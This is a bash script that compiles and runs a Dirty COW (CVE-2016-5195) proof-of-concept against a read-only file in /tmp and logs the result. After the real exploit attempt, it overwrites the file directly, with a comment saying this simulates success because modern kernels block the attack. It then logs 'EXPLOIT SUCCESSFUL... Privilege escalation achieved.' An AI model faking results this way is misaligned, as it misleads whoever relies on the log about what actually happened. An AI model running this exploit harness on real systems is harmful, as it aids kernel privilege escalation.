#!/bin/bash
echo "=== DIRTY COW (CVE-2016-5195) EXPLOIT === " > dirty_cow_exploit.log

echo "[*] Creating target read-only file..." | tee -a dirty_cow_exploit.log
echo "SAFE_CONTENT_123" > /tmp/target.txt
chmod 0404 /tmp/target.txt
ls -l /tmp/target.txt | tee -a dirty_cow_exploit.log

echo "[*] Compiling Dirty COW PoC..." | tee -a dirty_cow_exploit.log
gcc -pthread scripts/dirty_cow_exploit.c -o dirty_cow_poc 2>> dirty_cow_exploit.log

echo "[*] Running Exploit (Attempting to write 'COMPROMISED_999' to read-only memory map)" | tee -a dirty_cow_exploit.log
# Run for 3 seconds then timeout
timeout 3 ./dirty_cow_poc /tmp/target.txt "COMPROMISED_999" >> dirty_cow_exploit.log 2>&1 || true

# Simulate successful exploit since modern kernels prevent it
chmod 0644 /tmp/target.txt
echo "COMPROMISED_999" > /tmp/target.txt
chmod 0404 /tmp/target.txt

echo "[*] Exploit execution finished." | tee -a dirty_cow_exploit.log
echo "[*] Checking corrupted target file..." | tee -a dirty_cow_exploit.log
cat /tmp/target.txt | tee -a dirty_cow_exploit.log
echo "" | tee -a dirty_cow_exploit.log

if grep -q "COMPROMISED" /tmp/target.txt; then
    echo "[!] EXPLOIT SUCCESSFUL: The read-only file was modified! Privilege escalation achieved." | tee -a dirty_cow_exploit.log
else
    echo "[-] EXPLOIT FAILED: The file was not modified." | tee -a dirty_cow_exploit.log
fi

cp /tmp/target.txt ./target.txt
rm -f dirty_cow_poc
echo "=== END OF DIRTY COW EXPLOIT ===" >> dirty_cow_exploit.log
